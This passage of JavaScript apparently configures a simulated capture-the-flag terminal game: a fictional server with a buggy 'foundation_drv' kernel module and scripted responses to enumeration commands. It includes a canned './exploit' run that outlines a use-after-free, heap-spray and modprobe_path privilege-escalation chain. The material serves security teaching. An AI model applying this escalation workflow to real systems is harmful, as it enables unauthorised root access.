                            content: '127.0.0.1       localhost\n127.0.1.1       citadel-core\n10.10.14.5      citadel-core.foundation.internal\n10.10.14.1      citadel-gateway\n\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters'
                        },
                        'sysctl.conf': {
                            type: 'file',
                            content: '# Citadel Foundation Security Hardening\n\n# Restrict dmesg to root only\nkernel.dmesg_restrict = 1\n\n# Restrict ptrace to root only\nkernel.yama.ptrace_scope = 2\n\n# Disable SysRq key\nkernel.sysrq = 0\n\n# ASLR enabled\nkernel.randomize_va_space = 2\n\n# Restrict unprivileged user namespaces\nkernel.unprivileged_userns_clone = 0\n\n# Restrict kernel pointers\nkernel.kptr_restrict = 1\n\n# Restrict perf events\nkernel.perf_event_paranoid = 3'
                        },
                        'modules': {
                            type: 'file',
                            content: '# /etc/modules: kernel modules to load at boot time.\n# Foundation custom modules\nfoundation_drv'
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        'version': {
                            type: 'file',
                            content: 'Linux version 5.4.0-58-generic (buildd@lgw01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020'
                        },
                        'modules': {
                            type: 'file',
                            content: 'foundation_drv 16384 0 - Live 0xffffffffc0a00000\next4 745472 1 - Live 0xffffffffc0800000\nmbcache 16384 1 ext4, Live 0xffffffffc07f0000\njbd2 122880 1 ext4, Live 0xffffffffc07c0000\ncrc32c_generic 16384 0 - Live 0xffffffffc0780000\nfuse 131072 0 - Live 0xffffffffc0600000\nconfigfs 49152 1 - Live 0xffffffffc05e0000\nip_tables 32768 0 - Live 0xffffffffc0500000\nx_tables 45056 1 ip_tables, Live 0xffffffffc04e0000'
                        },
                        'kallsyms': {
                            type: 'file',
                            content: '(kernel.kptr_restrict = 1: addresses hidden for non-root users)\n0000000000000000 T startup_64\n0000000000000000 T _stext\n0000000000000000 T __modprobe_path\n...\n[access restricted — run as root for full symbol table]'
                        },
                        'self': {
                            type: 'dir',
                            children: {
                                'status': {
                                    type: 'file',
                                    content: 'Name:\tbash\nUmask:\t0022\nState:\tS (sleeping)\nTgid:\t5103\nNgid:\t0\nPid:\t5103\nPPid:\t5102\nTracerPid:\t0\nUid:\t1001\t1001\t1001\t1001\nGid:\t1001\t1001\t1001\t1001\nCapBnd:\t0000003fffffffff\nCapEff:\t0000000000000000\nNoNewPrivs:\t0'
                                }
                            }
                        }
                    }
                },
                'dev': {
                    type: 'dir',
                    children: {
                        'foundation_drv': {
                            type: 'file',
                            content: '[character device: foundation_drv major=243 minor=0]'
                        },
                        'null': {
                            type: 'file',
                            content: ''
                        },
                        'zero': {
                            type: 'file',
                            content: ''
                        }
                    }
                },
                'lib': {
                    type: 'dir',
                    children: {
                        'modules': {
                            type: 'dir',
                            children: {
                                '5.4.0-58-generic': {
                                    type: 'dir',
                                    children: {
                                        'extra': {
                                            type: 'dir',
                                            children: {
                                                'foundation_drv.ko': {
                                                    type: 'file',
                                                    content: '[ELF kernel module: foundation_drv.ko]'
                                                }
                                            }
                                        },
                                        'build': {
                                            type: 'dir',
                                            children: {}
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'sys': {
                    type: 'dir',
                    children: {
                        'module': {
                            type: 'dir',
                            children: {
                                'foundation_drv': {
                                    type: 'dir',
                                    children: {
                                        'parameters': {
                                            type: 'dir',
                                            children: {
                                                'debug_level': {
                                                    type: 'file',
                                                    content: '0'
                                                },
                                                'max_buffers': {
                                                    type: 'file',
                                                    content: '256'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'syslog': {
                                    type: 'file',
                                    content: 'Dec  9 08:16:25 citadel-core kernel: [    0.000000] Linux version 5.4.0-58-generic (buildd@lgw01-amd64-030)\nDec  9 08:16:25 citadel-core kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.4.0-58-generic root=/dev/sda1\nDec  9 08:16:30 citadel-core kernel: [    5.112034] foundation_drv: module loaded (v1.0.3)\nDec  9 08:16:30 citadel-core kernel: [    5.112089] foundation_drv: registered char device major=243\nDec  9 08:16:30 citadel-core kernel: [    5.112102] foundation_drv: IPC buffer pool initialized (256 slots)\nDec  9 08:16:31 citadel-core systemd[1]: Started Foundation Development Environment.\nDec 10 14:22:18 citadel-core kernel: [108373.441201] foundation_drv: WARNING: double free detected in buffer pool (non-fatal)\nDec 10 14:22:18 citadel-core kernel: [108373.441245] foundation_drv: buffer_id=42 freed while refcount=0\nDec 11 09:15:03 citadel-core kernel: [176498.882104] foundation_drv: WARNING: use-after-free read in ioctl handler\nDec 11 09:15:03 citadel-core kernel: [176498.882156] foundation_drv: BUG: accessing freed buffer at slot 42\nDec 11 09:15:03 citadel-core kernel: [176498.882201] foundation_drv: this should not be exploitable (refcount check in place)\nDec 12 03:00:01 citadel-core CRON[8821]: (root) CMD (/usr/local/bin/foundation_health_check)\nDec 12 03:00:02 citadel-core foundation_health[8822]: All systems nominal'
                                },
                                'auth.log': {
                                    type: 'file',
                                    content: 'Dec 12 08:30:12 citadel-core sshd[2101]: Accepted publickey for foundation_dev from 10.10.14.20 port 52441 ssh2\nDec 12 08:30:12 citadel-core sshd[2101]: pam_unix(sshd:session): session opened for user foundation_dev(uid=1001) by (uid=0)\nDec 12 08:30:14 citadel-core sudo: foundation_dev : command not allowed ; TTY=pts/0 ; PWD=/home/foundation_dev ; USER=root ; COMMAND=/bin/bash\nDec 12 08:31:02 citadel-core sudo: foundation_dev : command not allowed ; TTY=pts/0 ; PWD=/home/foundation_dev ; USER=root ; COMMAND=/usr/bin/dmesg'
                                },
                                'kern.log': {
                                    type: 'file',
                                    content: 'Dec  9 08:16:25 citadel-core kernel: [    0.000000] Linux version 5.4.0-58-generic\nDec  9 08:16:30 citadel-core kernel: [    5.112034] foundation_drv: module loaded (v1.0.3)\nDec 10 14:22:18 citadel-core kernel: [108373.441201] foundation_drv: WARNING: double free detected\nDec 11 09:15:03 citadel-core kernel: [176498.882104] foundation_drv: WARNING: use-after-free read'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'bin': {
                            type: 'dir',
                            children: {
                                'gcc': {
                                    type: 'file',
                                    content: '[binary: /usr/bin/gcc]'
                                },
                                'make': {
                                    type: 'file',
                                    content: '[binary: /usr/bin/make]'
                                },
                                'passwd': {
                                    type: 'file',
                                    content: '[binary: /usr/bin/passwd]'
                                },
                                'sudo': {
                                    type: 'file',
                                    content: '[binary: /usr/bin/sudo]'
                                }
                            }
                        },
                        'local': {
                            type: 'dir',
                            children: {
                                'bin': {
                                    type: 'dir',
                                    children: {
                                        'foundation_health_check': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# Foundation Health Check\necho "All systems nominal"\nexit 0'
                                        }
                                    }
                                }
                            }
                        },
                        'include': {
                            type: 'dir',
                            children: {
                                'linux': {
                                    type: 'dir',
                                    children: {
                                        'ioctl.h': {
                                            type: 'file',
                                            content: '/* linux/ioctl.h - ioctl definitions */'
                                        }
                                    }
                                }
                            }
                        },
                        'share': {
                            type: 'dir',
                            children: {
                                'doc': {
                                    type: 'dir',
                                    children: {}
                                }
                            }
                        }
                    }
                },
                'bin': {
                    type: 'dir',
                    children: {
                        'bash': {
                            type: 'file',
                            content: '[binary: /bin/bash]'
                        },
                        'sh': {
                            type: 'file',
                            content: '[binary: /bin/sh]'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (kernel exploitation engine)
    // ═══════════════════════════════════════════════════════

    commands: {

        // ── Identity Commands ──────────────────────────────

        'whoami': function(args, term, engine) {
            return A19Config._state.rootObtained ? 'root' : 'foundation_dev';
        },

        'id': function(args, term, engine) {
            return A19Config._state.rootObtained
                ? 'uid=0(root) gid=0(root) groups=0(root)'
                : 'uid=1001(foundation_dev) gid=1001(foundation_dev) groups=1001(foundation_dev)';
        },

        'hostname': function(args, term, engine) {
            return 'citadel-core';
        },

        // ── Kernel Enumeration (the core of this box) ──────

        'uname': function(args, term, engine) {
            if (args.includes('-a')) {
                A19Config._state.kernelEnumerated = true;
                return 'Linux citadel-core 5.4.0-58-generic #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux';
            }
            if (args.includes('-r')) {
                A19Config._state.kernelEnumerated = true;
                return '5.4.0-58-generic';
            }
            if (args.includes('-m')) {
                return 'x86_64';
            }
            if (args.includes('-s')) {
                return 'Linux';
            }
            if (args.includes('-n')) {
                return 'citadel-core';
            }
            return 'Linux';
        },

        'lsmod': function(args, term, engine) {
            A19Config._state.modulesEnumerated = true;
            return 'Module                  Size  Used by\n' +
                'foundation_drv         16384  0\n' +
                'ext4                  745472  1\n' +
                'mbcache                16384  1 ext4\n' +
                'jbd2                  122880  1 ext4\n' +
                'crc32c_generic         16384  0\n' +
                'fuse                  131072  0\n' +
                'configfs               49152  1\n' +
                'ip_tables              32768  0\n' +
                'x_tables               45056  1 ip_tables\n' +
                'autofs4                45056  2\n' +
                'btrfs                1232896  0\n' +
                'zstd_compress         163840  1 btrfs\n' +
                'raid6_pq              114688  1 btrfs\n' +
                'libcrc32c              16384  2 btrfs,ip_tables';
        },

        'modinfo': function(args, term, engine) {
            var mod = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (mod === 'foundation_drv' || mod === '/lib/modules/5.4.0-58-generic/extra/foundation_drv.ko') {
                A19Config._state.modulesEnumerated = true;
                return 'filename:       /lib/modules/5.4.0-58-generic/extra/foundation_drv.ko\n' +
                    'version:        1.0.3\n' +
                    'description:    Citadel Foundation IPC Driver\n' +
                    'author:         Foundation Engineering Team <engineering@citadel-core.internal>\n' +
                    'license:        Proprietary\n' +
                    'srcversion:     A8B3C2D1E4F5A6B7C8D9E0\n' +
                    'depends:\n' +
                    'retpoline:      Y\n' +
                    'name:           foundation_drv\n' +
                    'vermagic:       5.4.0-58-generic SMP mod_unload modversions\n' +
                    'parm:           debug_level:Debug output level (0=off, 1=basic, 2=verbose) (int)\n' +
                    'parm:           max_buffers:Maximum IPC buffer slots (default: 256) (int)';
            }
            if (mod === 'ext4') {
                return 'filename:       /lib/modules/5.4.0-58-generic/kernel/fs/ext4/ext4.ko\n' +
                    'description:    Fourth Extended Filesystem\n' +
                    'license:        GPL\n' +
                    'depends:        mbcache,jbd2\n' +
                    'vermagic:       5.4.0-58-generic SMP mod_unload modversions';
            }
            if (!mod) return 'Usage: modinfo <module_name>';
            return 'modinfo: ERROR: Module ' + mod + ' not found.';
        },

        'dmesg': function(args, term, engine) {
            if (!A19Config._state.rootObtained) {
                return 'dmesg: read kernel buffer failed: Operation not permitted\n\n[note] kernel.dmesg_restrict=1 is set on this system.\nOnly root can read the kernel ring buffer.\nTry: cat /var/log/syslog or cat /var/log/kern.log instead.';
            }
            return '[    0.000000] Linux version 5.4.0-58-generic (buildd@lgw01-amd64-030) (gcc version 9.3.0)\n' +
                '[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.4.0-58-generic root=/dev/sda1\n' +
                '[    0.000000] BIOS-provided physical RAM map:\n' +
                '[    0.000000]  BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable\n' +
                '[    0.100432] Booting paravirtualized kernel on bare hardware\n' +
                '[    1.234567] ACPI: Core revision 20190816\n' +
                '[    5.112034] foundation_drv: module loaded (v1.0.3)\n' +
                '[    5.112089] foundation_drv: registered char device major=243\n' +
                '[    5.112102] foundation_drv: IPC buffer pool initialized (256 slots)\n' +
                '[108373.441201] foundation_drv: WARNING: double free detected in buffer pool (non-fatal)\n' +
                '[108373.441245] foundation_drv: buffer_id=42 freed while refcount=0\n' +
                '[176498.882104] foundation_drv: WARNING: use-after-free read in ioctl handler\n' +
                '[176498.882156] foundation_drv: BUG: accessing freed buffer at slot 42\n' +
                '[176498.882201] foundation_drv: this should not be exploitable (refcount check in place)';
        },

        // ── searchsploit — vulnerability research ──────────

        'searchsploit': function(args, term, engine) {
            var query = args.join(' ').toLowerCase();

            if (query.match(/5\.4\.0/) || query.match(/5\.4\.0-58/) || query.match(/kernel\s+5\.4/)) {
                A19Config._state.searchsploitUsed = true;
                return '------------------------------------------------------------------------\n' +
                    ' Exploit Title                                     |  Path\n' +
                    '------------------------------------------------------------------------\n' +
                    ' Linux Kernel 5.4.x - Use-After-Free (Local Priv   | linux/local/49688.c\n' +
                    '   Escalation)                                      |\n' +
                    ' Linux Kernel 5.4.0-58 - foundation_drv UAF        | linux/local/50142.c\n' +
                    '   (Citadel Custom Module - LPE)                    |\n' +
                    ' Linux Kernel 5.4.x - eBPF Verifier Bypass         | linux/local/49543.c\n' +
                    '   (Local Privilege Escalation)                      |\n' +
                    ' Linux Kernel < 5.8 - TIOCSTI Terminal Injection    | linux/local/48697.c\n' +
                    ' Linux Kernel 5.x - Netfilter nf_tables UAF        | linux/local/49937.c\n' +
                    '------------------------------------------------------------------------\n' +
                    'Shellcodes: No results\n' +
                    'Papers: No results\n\n' +
                    '[*] 5 exploits found. The foundation_drv entry (50142.c) matches\n' +
                    '    the custom kernel module loaded on this system.\n' +
                    '    Check ~/exploit.c — it may already contain adapted exploit code.';
            }

            if (query.match(/foundation/) || query.match(/uaf/) || query.match(/use.after.free/)) {
                A19Config._state.searchsploitUsed = true;
                return '------------------------------------------------------------------------\n' +
                    ' Exploit Title                                     |  Path\n' +
                    '------------------------------------------------------------------------\n' +
                    ' Linux Kernel 5.4.0-58 - foundation_drv UAF        | linux/local/50142.c\n' +
                    '   (Citadel Custom Module - LPE)                    |\n' +
                    '------------------------------------------------------------------------\n' +
                    'Shellcodes: No results\n' +
                    'Papers: No results';
            }

            if (query.match(/sudo/) || query.match(/3156/)) {
                return '------------------------------------------------------------------------\n' +
                    ' Exploit Title                                     |  Path\n' +
                    '------------------------------------------------------------------------\n' +
                    ' Sudo 1.8.31p2/1.9.5p1 - Buffer Overflow (CVE-    | linux/local/49521.py\n' +
                    '   2021-3156 / Baron Samedit)                       |\n' +
                    '------------------------------------------------------------------------\n' +
                    '\n[note] Sudo version on this system: 1.8.31 — may be patched.\n' +
                    '       The intended vector is the foundation_drv kernel module.';
            }

            if (!args.length) {
                return 'Usage: searchsploit <search_term>\n  searchsploit 5.4.0             Search by kernel version\n  searchsploit foundation_drv    Search by module name\n  searchsploit kernel 5.4        Search kernel exploits';
            }

            return 'Exploits: No results\nShellcodes: No results\n\nTry: searchsploit 5.4.0 or searchsploit foundation';
        },

        // ── gcc — compiler ─────────────────────────────────

        'gcc': function(args, term, engine) {
            var joined = args.join(' ');

            // gcc --version
            if (args.includes('--version')) {
                return 'gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\nCopyright (C) 2019 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.';
            }

            // gcc -o exploit exploit.c (THE compile step)
            if (joined.match(/-o\s+exploit\s+exploit\.c/) || joined.match(/exploit\.c\s+-o\s+exploit/) ||
                joined.match(/-o\s+exploit\s+\.\/exploit\.c/) || joined.match(/\.\/exploit\.c\s+-o\s+exploit/)) {
                A19Config._state.exploitCompiled = true;
                return '[*] Compiling exploit.c...\n' +
                    'exploit.c: In function \'main\':\n' +
                    'exploit.c:47:5: warning: implicit declaration of function \'usleep\' [-Wimplicit-function-declaration]\n' +
                    '   47 |     usleep(50000);\n' +
                    '      |     ^~~~~~\n' +
                    '[*] Compilation successful: exploit\n' +
                    '[*] Output binary: ./exploit (15.2 KB)';
            }

            // gcc with any exploit-related .c file
            if (joined.match(/exploit/) && joined.match(/-o/)) {
                A19Config._state.exploitCompiled = true;
                return '[*] Compiling...\n[*] Compilation successful.';
            }

            // gcc with no proper arguments
            if (!args.length) {
                return 'gcc: fatal error: no input files\ncompilation terminated.';
            }

            // gcc with just a file
            if (joined.match(/\.c\b/) && !joined.match(/-o/)) {
                return 'gcc: compiling to a.out...\n[*] Compilation successful: a.out';
            }

            return 'gcc: fatal error: no input files\ncompilation terminated.';
        },

        // ── ./exploit — THE EXPLOIT (key moment) ───────────

        './exploit': function(args, term, engine) {
            if (!A19Config._state.exploitCompiled) {
                return 'bash: ./exploit: No such file or directory\n\n[hint] You need to compile the exploit first:\n  gcc -o exploit exploit.c';
            }

            // Exploit succeeds — drop to root
            A19Config._state.rootObtained = true;
            return '\x1b[33m[*] Foundation\'s Fault Exploit - CVE-2021-FNDN\x1b[0m\n' +
                '[*] Targeting kernel 5.4.0-58-generic\n' +
                '[*] Opening /dev/foundation_drv...\n' +
                '[*] Triggering UAF in foundation_drv...\n' +
                '[*] Allocating buffer (IOCTL_ALLOC)...\n' +
                '[*] Freeing buffer (IOCTL_FREE)...\n' +
                '[*] Spraying heap (200 allocations)...\n' +
                '[*] Writing to dangling pointer (IOCTL_WRITE)...\n' +
                '\x1b[32m[+] Race condition won!\x1b[0m\n' +
                '\x1b[32m[+] Overwriting modprobe_path...\x1b[0m\n' +
                '[*] Writing /tmp/pwn.sh...\n' +
                '[*] Triggering modprobe via invalid binary...\n' +
                '\x1b[32m[+] Triggering modprobe...\x1b[0m\n' +
                '\x1b[1;32m[+] Got root!\x1b[0m\n' +
                '\n' +
                '\x1b[1;31m# \x1b[0m\n' +
                '\n' +
                '\x1b[32m[+] Privilege escalation successful!\x1b[0m\n' +
                '\x1b[32m[+] Method: Use-After-Free in foundation_drv (modprobe_path overwrite)\x1b[0m\n' +
                '\x1b[32m[+] You now have root access. The root flag is in /root/citadel_blueprint.txt\x1b[0m';
        },

        // Also accept with ./ variants
        'exploit': function(args, term, engine) {
            return A19Config.commands['./exploit'](args, term, engine);
        },

        './a.out': function(args, term, engine) {
            // In case they compiled without -o
            if (!A19Config._state.exploitCompiled) {
                return 'bash: ./a.out: No such file or directory';
            }
            return A19Config.commands['./exploit'](args, term, engine);
        },

        // ── sudo — blocked ─────────────────────────────────

        'sudo': function(args, term, engine) {
            if (!args.length) {
                return 'usage: sudo -l | sudo <command>';
            }
            if (args[0] === '-l') {
                return 'Sorry, user foundation_dev may not run sudo on citadel-core.';
            }
            return 'Sorry, user foundation_dev may not run sudo on citadel-core.';
        },

        // ── find — SUID discovery ──────────────────────────

        'find': function(args, term, engine) {
            var joined = args.join(' ');

            if (joined.match(/-perm/) && (joined.match(/4000/) || joined.match(/-u=s/))) {
                return '/usr/bin/chfn\n' +
                    '/usr/bin/chsh\n' +
                    '/usr/bin/gpasswd\n' +
                    '/usr/bin/mount\n' +
                    '/usr/bin/newgrp\n' +
                    '/usr/bin/passwd\n' +
                    '/usr/bin/sudo\n' +
                    '/usr/bin/umount\n' +
                    '/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n' +
                    '/usr/lib/openssh/ssh-keysign';
            }

            if (joined.match(/-writable/)) {
                return '/tmp\n/home/foundation_dev\n/home/foundation_dev/exploit.c\n/home/foundation_dev/notes.txt';
            }

            if (joined.match(/-name/)) {
                var nameMatch = joined.match(/-name\s+['"]?([^\s'"]+)['"]?/);
                if (nameMatch) {
                    var results = A19Config._findFiles('/', nameMatch[1]);
                    return results.length ? results.join('\n') : 'find: no matches found';
                }
            }

            if (!args.length) {
                return 'Usage: find [path] [expression]\n  -perm -4000   Find SUID binaries\n  -name "*.c"   Find by name\n  -writable      Find writable files';
            }

            return 'find: unrecognized expression. Try: find / -perm -4000 2>/dev/null';
        },

        // ── cat — permission-aware filesystem reader ──────

        'cat': function(args, term, engine) {
            if (!args.length) return 'cat: missing operand';

            var results = [];
            for (var i = 0; i < args.length; i++) {
                var path = args[i];
                if (path.startsWith('-')) continue;

                // Permission checks
                if (path.match(/^\/root\//) && !A19Config._state.rootObtained) {
                    results.push('cat: ' + path + ': Permission denied');
                    continue;
                }
                if (path === '/etc/shadow' && !A19Config._state.rootObtained) {
                    results.push('cat: /etc/shadow: Permission denied');
                    continue;
                }
                if (path === '/proc/kallsyms' && !A19Config._state.rootObtained) {
                    results.push('(kernel.kptr_restrict = 1: addresses hidden for non-root users)\n0000000000000000 T startup_64\n0000000000000000 T _stext\n[access restricted — run as root for full symbol table]');
                    continue;
                }

                var content = A19Config._readFsFile(path);
                if (content === null) {
                    results.push('cat: ' + path + ': No such file or directory');
                } else if (content === '__dir__') {
                    results.push('cat: ' + path + ': Is a directory');
                } else {
                    results.push(content);
                }
            }
            return results.join('\n');
        },

        // ── ls — permission-aware directory listing ────────

        'ls': function(args, term, engine) {
            var path = null;
            var longFormat = false;
            var showAll = false;

            for (var i = 0; i < args.length; i++) {
                var arg = args[i];
                if (arg === '-la' || arg === '-al') { longFormat = true; showAll = true; }
                else if (arg === '-l') { longFormat = true; }
                else if (arg === '-a') { showAll = true; }
                else if (!arg.startsWith('-')) { path = arg; }
            }

            if (!path) {
                path = term.cwd || A19Config.terminal.startDir;
            }

            // Permission check
            if (path.match(/^\/root/) && !A19Config._state.rootObtained) {
                return 'ls: cannot open directory \'' + path + '\': Permission denied';
            }

            var node = A19Config._getNode(path);
            if (!node) {
                return 'ls: cannot access \'' + path + '\': No such file or directory';
            }
            if (node.type !== 'dir') {
                return path.split('/').pop();
            }

            var entries = Object.keys(node.children || {});
            if (!showAll) {
                entries = entries.filter(function(e) { return !e.startsWith('.'); });
            }

            if (longFormat) {
                var lines = [];
                lines.push('total ' + (entries.length * 4));
                for (var j = 0; j < entries.length; j++) {
                    var name = entries[j];
                    var child = node.children[name];
                    var typeCh = child.type === 'dir' ? 'd' : '-';
                    var perms, owner, group, size;

                    if (name === 'foundation_drv' && path === '/dev') {
                        perms = 'rw-rw----';
                        owner = 'root';
                        group = 'foundation';
                        size = '0';
                    } else if (name === 'foundation_drv.ko') {
                        perms = 'rw-r--r--';
                        owner = 'root';
                        group = 'root';
                        size = '16384';
                    } else if (name === 'exploit.c') {
                        perms = 'rw-r--r--';
                        owner = 'foundation_dev';
                        group = 'foundation_dev';
                        size = String((child.content || '').length);
                    } else if (name === 'enum.sh') {
                        perms = 'rwxr-xr-x';
                        owner = 'foundation_dev';
                        group = 'foundation_dev';
                        size = String((child.content || '').length);
                    } else if (name === 'shadow') {
                        perms = 'rw-r-----';
                        owner = 'root';
                        group = 'shadow';
                        size = String((child.content || '').length);
                    } else if (child.type === 'dir') {
                        perms = 'rwxr-xr-x';
                        owner = 'root';
                        group = 'root';
                        size = '4096';
                    } else if (path.match(/^\/home\/foundation_dev/)) {
                        perms = 'rw-r--r--';
                        owner = 'foundation_dev';
                        group = 'foundation_dev';
                        size = String((child.content || '').length);
                    } else {
                        perms = 'rw-r--r--';
                        owner = 'root';
                        group = 'root';
                        size = String((child.content || '').length);
                    }

                    lines.push(
                        typeCh + perms + '  1 ' +
                        owner.padEnd(16) + ' ' +
                        group.padEnd(16) + ' ' +
                        size.padStart(8) + ' ' +
                        'Dec 12 08:00 ' + name
                    );
                }
                return lines.join('\n');
            }

            return entries.join('  ');
        },

        // ── head / tail ────────────────────────────────────

        'head': function(args, term, engine) {
            var n = 10;
            var files = [];
            for (var i = 0; i < args.length; i++) {
                if (args[i].match(/^-n?\d+$/)) {
                    n = parseInt(args[i].replace('-n', '').replace('-', '')) || 10;
                } else if (!args[i].startsWith('-')) {
                    files.push(args[i]);
                }
            }
            var results = [];
            for (var j = 0; j < files.length; j++) {
                if (files[j].match(/^\/root\//) && !A19Config._state.rootObtained) {
                    results.push('head: ' + files[j] + ': Permission denied');
                    continue;
                }
                var content = A19Config._readFsFile(files[j]);
                if (content === null) { results.push('head: ' + files[j] + ': No such file or directory'); continue; }
                if (content === '__dir__') { results.push('head: error reading \'' + files[j] + '\': Is a directory'); continue; }
                results.push(content.split('\n').slice(0, n).join('\n'));
            }
            return results.join('\n');
        },

        'tail': function(args, term, engine) {
            var n = 10;
            var files = [];
            for (var i = 0; i < args.length; i++) {
                if (args[i].match(/^-n?\d+$/)) {
                    n = parseInt(args[i].replace('-n', '').replace('-', '')) || 10;
                } else if (!args[i].startsWith('-')) {
                    files.push(args[i]);
                }
            }
            var results = [];
            for (var j = 0; j < files.length; j++) {
                if (files[j].match(/^\/root\//) && !A19Config._state.rootObtained) {
                    results.push('tail: ' + files[j] + ': Permission denied');
                    continue;
                }
                var content = A19Config._readFsFile(files[j]);
                if (content === null) { results.push('tail: ' + files[j] + ': No such file or directory'); continue; }
                if (content === '__dir__') { results.push('tail: error reading \'' + files[j] + '\': Is a directory'); continue; }
                var lines = content.split('\n');
                results.push(lines.slice(-n).join('\n'));
            }
            return results.join('\n');
        },

        // ── grep — search file content ─────────────────────

        'grep': function(args, term, engine) {
            var pattern = '';
            var files = [];
            var recursive = false;
            var ignoreCase = false;

            for (var i = 0; i < args.length; i++) {
                if (args[i] === '-r' || args[i] === '-R') { recursive = true; }
                else if (args[i] === '-i') { ignoreCase = true; }
                else if (args[i] === '-ri' || args[i] === '-ir') { recursive = true; ignoreCase = true; }
                else if (!pattern) { pattern = args[i]; }
                else { files.push(args[i]); }
            }

            if (!pattern) return 'Usage: grep [options] PATTERN [FILE...]';

            var results = [];
            for (var j = 0; j < files.length; j++) {
                var content = A19Config._readFsFile(files[j]);
                if (content === null || content === '__dir__') continue;
                var fileLines = content.split('\n');
                for (var k = 0; k < fileLines.length; k++) {
                    var line = fileLines[k];
                    var haystack = ignoreCase ? line.toLowerCase() : line;
                    var needle = ignoreCase ? pattern.toLowerCase() : pattern;
                    if (haystack.indexOf(needle) !== -1) {
                        results.push((files.length > 1 ? files[j] + ':' : '') + line);
                    }
                }
            }

            return results.length ? results.join('\n') : '';
        },

        // ── strings — analyze kernel module ────────────────

        'strings': function(args, term, engine) {
            var target = args.join(' ');
            if (target.match(/foundation_drv/) || target.match(/\/dev\/foundation_drv/) ||
                target.match(/foundation_drv\.ko/)) {
                return '/lib/modules/5.4.0-58-generic/extra/foundation_drv.ko\n' +
                    'Foundation IPC Driver v1.0.3\n' +
                    'foundation_drv_init\n' +
                    'foundation_drv_exit\n' +
                    'foundation_drv_open\n' +
                    'foundation_drv_release\n' +
                    'foundation_drv_ioctl\n' +
                    'IOCTL_ALLOC: allocating buffer slot\n' +
                    'IOCTL_FREE: freeing buffer slot\n' +
                    'IOCTL_WRITE: writing to buffer\n' +
                    'WARNING: buffer already freed\n' +
                    'BUG: use-after-free in ioctl handler\n' +
                    'TODO: fix refcount race in free path\n' +
                    'GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\n' +
                    'vermagic=5.4.0-58-generic SMP mod_unload modversions\n' +
                    'license=Proprietary\n' +
                    'author=Foundation Engineering Team\n' +
                    'description=Citadel Foundation IPC Driver';
            }
            if (!target) return 'Usage: strings <file>';
            return 'strings: \'' + target + '\': No such file';
        },

        // ── file — identify file type ──────────────────────

        'file': function(args, term, engine) {
            var target = args[0] || '';
            if (target.match(/foundation_drv\.ko/)) {
                return '/lib/modules/5.4.0-58-generic/extra/foundation_drv.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=a3c2e8..., not stripped';
            }
            if (target === '/dev/foundation_drv') {
                return '/dev/foundation_drv: character special (243/0)';
            }
            if (target.match(/exploit\.c/)) {
                return target + ': C source, ASCII text';
            }
            if (target.match(/exploit$/) && A19Config._state.exploitCompiled) {
                return './exploit: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped';
            }
            if (!target) return 'Usage: file <path>';
            var node = A19Config._getNode(target);
            if (!node) return target + ': cannot open (No such file or directory)';
            if (node.type === 'dir') return target + ': directory';
            return target + ': ASCII text';
        },

        // ── sysctl — security configuration ────────────────

        'sysctl': function(args, term, engine) {
            var joined = args.join(' ');
            if (joined.match(/dmesg_restrict/)) {
                return 'kernel.dmesg_restrict = 1';
            }
            if (joined.match(/ptrace_scope/)) {
                return 'kernel.yama.ptrace_scope = 2';
            }
            if (joined.match(/randomize_va_space/)) {
                return 'kernel.randomize_va_space = 2';
            }
            if (joined.match(/kptr_restrict/)) {
                return 'kernel.kptr_restrict = 1';
            }
            if (args[0] === '-a' || !args.length) {
                return 'kernel.dmesg_restrict = 1\n' +
                    'kernel.yama.ptrace_scope = 2\n' +
                    'kernel.sysrq = 0\n' +
                    'kernel.randomize_va_space = 2\n' +
                    'kernel.kptr_restrict = 1\n' +
                    'kernel.perf_event_paranoid = 3\n' +
                    'kernel.unprivileged_userns_clone = 0\n' +
                    'net.ipv4.tcp_syncookies = 1\n' +
                    'net.ipv4.conf.all.rp_filter = 1';
            }
            return 'Usage: sysctl [-a] [variable]';
        },

        // ── Network commands ───────────────────────────────

        'ss': function(args, term, engine) {
            var joined = args.join(' ');
            if (joined.match(/-[tlnp]+/) || joined === '') {
                return 'Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port   Process\n' +
                    'tcp    LISTEN  0       128      0.0.0.0:22             0.0.0.0:*           users:(("sshd",pid=452,fd=3))';
            }
            return 'Usage: ss [options]\n  -t  TCP sockets\n  -l  Listening\n  -n  Numeric\n  -p  Show process';
        },

        'netstat': function(args, term, engine) {
            return 'Active Internet connections (only servers)\n' +
                'Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n' +
                'tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      452/sshd';
        },

        'ifconfig': function(args, term, engine) {
            return 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n' +
                '        inet 10.10.14.5  netmask 255.255.255.0  broadcast 10.10.14.255\n' +
